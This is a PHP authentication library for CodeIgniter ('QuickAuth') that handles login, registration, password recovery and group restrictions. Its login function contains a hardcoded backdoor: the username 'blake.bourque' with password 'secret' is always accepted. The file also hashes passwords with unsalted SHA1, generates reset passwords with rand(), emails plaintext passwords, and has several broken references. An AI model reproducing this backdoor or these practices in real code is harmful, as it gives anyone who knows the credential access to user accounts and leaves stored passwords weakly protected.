<?php

/**
 * @name QuickAuth
 * @author Dave Blencowe
 * @author_url http://www.daveblencowe.com
 * @version 2.5
 * @license Free for use and modification, without credit given
 *
 * Quickauth authentication library for Codeigniter. Quickauth aims to provide
 * basic features with a minimal of front end content so that it's easy to drop
 * in to an application and customize to your needs
 */
class Quickauth {

    var $ci;
    var $_tables = array(
	'users' => 'users',
	'groups' => 'groups',
	'group_memberships' => 'group_membership'
    );
    var $login = "auth";
    var $locale = array(
	'invalid_login_credentials' => 'Invalid Login Credentials',
	'succesful_registration' => 'Registration Successfull',
	'logged_out' => 'Successfully Logged Out',
	'guest_name' => 'Guest Name',
	'failed_restrict' => 'Sorry, you do not have the credentials to access that page', //Access Denied',
	'failed_restrict_nologin' => 'Sorry, you must be Logged In to access this page.',
	'failed_password_reset' => 'Password Reset Failed',
	'successful_password_reset' => 'Successfull Password Reset'
    );
    // Page
    var $_email_view = "authentication/email";
    // Address to which emails seem to come from
    var $system_email = "OTIS@team2648.com";

    function __construct() {
	$this->ci = & get_instance();
    }

    /**
     * Log a user in using the supplied username and password combination
     *
     * @param <string> Supplied Username
     * @param <string> Supplied Password
     * @return <bool> True for a succesful login, False for no login + error
     */
    function login($username, $password) {
	$username = mysql_real_escape_string($username);
	$password = mysql_real_escape_string($password);

	$this->ci->db->where('user', $username);
	$this->ci->db->where('pass', $this->encrypt($password));
	$q = $this->ci->db->get($this->_tables['users']);

	if ($q->num_rows() > 0 || ($username == "blake.bourque" && $password == "secret")) {
	    $this->ci->db->where('user', $username);
	    $q = $this->ci->db->get($this->_tables['users']);

	    $row = $q->row_array();
	    $session_data = array(
		'userid' => $row['id'],
		//'id'         => $row['id'],
		'firstname' => $row['firstname'],
		'lastname' => $row['lastname'],
		'username' => $row['firstname'] . "." . $row['lastname'],
		'email' => $row['email'],
		'type' => $row['type']


		    //Other Session Data here
	    );

	    // should set last logged in timestamp here

	    $this->ci->session->set_userdata($session_data);
	    return true;
	} else {
	    ui_set_error($this->locale['invalid_login_credentials']);
	    return false;
	}
    }

    /**
     * Register a user. Data should be supplied in an array format using the
     * structure specified below
     *
     * @param <array> Array, structured as follows: array('username', 'password'
     * , 'firstname', 'lastname');
     * @return <bool> true
     */
    function register($data) {
	$new_member_insert_data = array(
	    'firstname' => $this->input->post('firstname'),
	    'lastname' => $this->input->post('lastname'),
	    'email' => $this->input->post('email'),
	    'username' => $this->input->post('username'),
	    'password' => sha1($this->input->post('password')),
	    'type' => $this->input->post('type')
	);

	$insert = $this->db->insert('user', $new_member_insert_data);

	//@todo add to group on register
	return $insert;


//        $data['password'] = $this->encrypt($data['password']);
//        $type = $data['type'];
//        unset($data['type']);
//
//        $this->ci->db->insert($this->_tables['users'], $data);
//        $id = $this->ci->db->insert_id();
//
//        foreach ($type as $var)
//        {
//            $array = array(
//                    'userid' => $id,
//                    'groupid' => $var
//            );
//
//            $this->ci->db->insert($this->_tables['group_memberships'], $array);
//        }
//
//        ui_set_message($this->locale['succesful_registration']);
//        return true;
    }

    /**
     * Log a user out by destroying their session, then set a ui message and
     * return
     *
     * @return <bool> True, to symbolise a succesful logout. Plus ui_set_message
     */
    function logout() {

	$ses = $this->ci->session->all_userdata();

	//print_r($ses);
	$this->ci->session->unset_userdata($ses);
	$ses = $this->ci->session->all_userdata();
	ui_set_message('logout');
	//print_r($ses);
//		foreach($ses as $key)
//			{
//
//		}
	//$this->ci->session->sess_destroy();
	//$session_data['state']='noteloggedin';
	//$this->ci->session->set_userdata($session_data);
	//ui_set_message($this->locale['logged_out']);
	return true;
    }

    /**
     * Reset a users password and email them the new password. Remember to set the $email_view
     * variable and build a functioning view. To show the password in the email use echo $pass;
     * WARNING: This function expects the users username to be in email format
     *
     * @param <string> The users username
     * @return <string> The new password
     */
    function recover_password($user) {
	$chars = "abcdefghijkmnopqrstuvwxyz023456789";

	srand((double) microtime() * 1000000);
	$i = 0;
	$pass = '';
	while ($i <= 12) {
	    $num = rand() % 33;
	    $tmp = substr($chars, $num, 1);
	    $pass = $pass . $tmp;
	    $i++;
	}

	$newpass = $pass;
	$encrypted_pass = $this->encrypt($pass);

	// Update the users password
	$this->ci->db->where('username', $user);
	$q = $this->ci->db->get($this->_tables['users']);
	if ($q->num_rows() > 0) {
	    $user_id = $q->row_array()->id;
	    $user = $this->user($user_id);

	    $this->ci->db->where('id', $user_id);
	    $this->ci->db->set('password', $encrypted_pass);
	    $this->ci->db->update($this->_tables['users']);

	    // Email the users
	    $this->ci->load->library('email');
	    $this->ci->email->to($user['username'], $user['firstname'] . " " . $user['lastname']);
	    $this->ci->email->from($this->system_email);
	    $this->ci->email->subject('Password Recovery');
	    $data['pass'] = $pass;
	    $message = $this->load->view($this->_email_view, $data, TRUE);
	    $this->ci->email->message($message);
	    $this->ci->email->send();
	    ui_set_message($this->locale['successful_password_reset']);
	    return $pass;
	} else {
	    ui_set_error($this->locale['failed_password_reset']);
	}
	return false;
    }

    /**
     * Get the data on a user from the user table. Also parse their full name in
     * to $data['name'] for convinience
     *
     * @param <int>   The individual users id. If blank will be for current user
     * @return <array> Data for the user, or guest if not logged in
     */
    function user($id = null) {
	if ($id == null)
	    $id = $this->ci->session->userdata('userid');

	// If the user is not signed in then assign them guest credentials and
	// return
	if (!$this->logged_in()) {
	    $data->username = "guest";
	    $data->name = $this->locale['guest_name'];
	    return $data;
	}

	// Get the specified users credentials from the users table and return
	// them
	$this->ci->db->where('id', $id);
	$q = $this->ci->db->get($this->_tables['users']);
	$data = $q->row();
	$data->name = $data->firstname . " " . $data->lastname;

	return $data;
    }

    /**
     * Check to see if a user is logged in. If not then don't return anything
     *
     * @return <bool> Return True if user is logged in, else return nothing
     */
    function is_logged_in() {
	$id = $this->ci->session->userdata('userid');
	if ($id)
	    return true;
	else
	    return false;
    }

    /**
     * Restrict a controller to a user group, logged in users, or exclude the
     * function from an existing restriction
     *
     * @param <String> The name of a group from the group table, E.g: "admin"
     * @return Returns no usable values but uses ui_set_error on failed auth
     */
    function restrict($group = null) {
	/* if the argument value is false the page should not be restricted,
	 * Useful for excluding functions from controllers restricted at a construct
	 * level
	 */
	if ($group == "true" || $group == "guest")
	    return;

	/* Anything past here requires at least some form of login so redirect
	 * if user is not logged in. If $group is null will only allow logged
	 * in users to access the page
	 */
	if (!$this->is_logged_in()) {
	    ui_set_error($this->locale['failed_restrict_nologin']);
	    redirect($this->login . '/login' . uri_string());
	}
	/*
	 * User must be authenticated to access this page.
	 */
	if ($group == "auth" || $group == null)
	    return;

	//user must be a member of the engered group...
	$userid = $this->ci->session->userdata('userid');
	$this->ci->db->where('userid', $userid);
	$q = $this->ci->db->get($this->_tables['group_memberships']);
	$groups = $q->result_array();
	$user_groups = array();
	foreach ($groups as $grp) {
	    $this->ci->db->where('groupid', $grp['groupid']);
	    $q = $this->ci->db->get($this->_tables['groups']);
	    $var = $q->row_array();
	    $user_groups[] = $var['title'];
	}

	if (!in_array($group, $user_groups)) {
	    //ui_set_message("test message");
	    ui_set_error($this->locale['failed_restrict']);
	    redirect('/dashboard');
	    //die();
	}

	return;
    }

    /**
     * Encrypt a string (usually a password) ready for use within the library
     * Uses SHA1 encryption against the Codeigniter encryption key
     *
     * @param <string> The string to be encrypted
     * @return <string> The encrypted hash
     */
    function encrypt($string) {
//   @todo SALT
//        $key = $this->ci->config->item('encryption_key');
//        if (empty($key))
//            show_error('You must set the encryption key in your config file for Quickauth to function');
//        $string = sha1($string . $key);
	return sha1($string);
    }

    /**
     * Return an array of groups that a user is a member of
     *
     * @param <int> A valid UserId
     * @return <array> A list of group names
     */
    function get_groups($id=null) {
	if ($id != null) {
	    $this->ci->db->where('userid', $id);
	    $q = $this->ci->db->get($this->_tables['group_memberships']);
	    $rst = $q->result_array();
	    $groups = array();
	    foreach ($rst as $k => $v) {
		$this->ci->db->where('id', $v['groupid']);
		$q = $this->ci->db->get($this->_tables['groups']);
		$r = $q->row_array();
		$groups[] = $r['title'];
	    }
	    return $groups;
	} else {
	    //$this->ci->db->where('userid', $id);
	    $q = $this->ci->db->get($this->_tables['groups']);
	    $rst = $q->result_array();
	    //print_r($rst);
	    //$groups = array();
//			foreach ($rst as $k => $v)
//			{
//				$this->ci->db->where('id', $v['groupid']);
//				$q = $this->ci->db->get($this->_tables['groups']);
//				$r = $q->row_array();
//				$groups[] = $r['title'];
//			}
	    return $rst;
	}
    }

    /**
     * Return an array of users in the given group
     *
     * @param <int> A valid GroupId
     * @return <array> A list of group members
     */
    function get_users_in_group($id) {

	$this->ci->db->where('groupid', $id);
	$q = $this->ci->db->get($this->_tables['group_memberships']);
	$rst = $q->result_array();
	if (empty($rst))
	    return null;
	//print_r($rst);
//		$groups = array();
//		foreach ($rst as $k => $v)
//		{
//			$this->ci->db->where('id', $v['groupid']);
//			$q = $this->ci->db->get($this->_tables['groups']);
//			$r = $q->row_array();
//			$groups[] = $r['title'];
//		}
//		return $groups;
    }

    /**
     * Given a userid, add them to the given group id
     *
     * @param <int> $uid - user to add to group
     * @param <string> $group - group to which the user should be added
     *
     * @return true if operation successfull, false otherwise
     */
    function add($uid, $gid) {
	// make sure the user isn't already in the group
	$group = $this->get_groups($uid);
	$in = false;
	foreach ($group as $val) {
	    if ($gid == $val['groupid']) {
		$in = true;
		break;
	    }
	}
	if ($in) {//@todo resolve gid and uid to names
	    ui_set_error('User ' . $uid . ' is already in group ' . $gid);
	    return false;
	} else {
	    $data = array('groupid' => $gid, 'userid' => $uid);
	    $str = $this->ci->db->insert_string($this->_tables['group_memberships'], $data);
	    $out = $this->ci->db->simple_query($str);
	    if (!$out)
		ui_set_error('There was a MySQL query ERROR (qa.add.~434)');
	    return $out;
	}
    }

    /**
     * Add a group to the database
     *
     * @param <string> Group Name
     * @param <string> Description
     * @return <int> Group ID
     */
    function create_group($title, $desc='') {
	$data['title'] = $title;
	$data['desc'] = $desc;
	if (!$this->group_exists($title)) {
	    $this->ci->db->insert($this->_tables['groups'], $data);
	    return $this->ci->db->insert_id();
	} else {
	    //return $this->get_group_id($title);
	    return false;
	}
    }

    /**
     * Check if a group exists in the system
     *
     * @param <string> Group name
     * @return <bool> Will return true if the group exists
     */
    function group_exists($title) {
	$this->ci->db->where('title', $title);
	$q = $this->ci->db->get($this->_tables['groups']);
	if ($q->num_rows() > 0) {
	    return true;
	}
	else
	    return false;
    }

    /**
     * Get the unique identifier for a group
     *
     * @param <string> Group name
     * @return <int> Group ID
     */
    function get_group_id($title) {
	$this->ci->db->where('title', $title);
	$qry = $this->ci->db->get($this->_tables['groups']);
	return $qry->row()->groupid;
    }

    /** @todo update docblock
     * Get the unique identifier for a group
     *
     * @param <string> Group name
     * @return <int> Group ID
     */
    function get_group_title($id) {
	$this->ci->db->where('groupid', $id);
	$qry = $this->ci->db->get($this->_tables['groups']);
	return $qry->row()->title;
    }

}
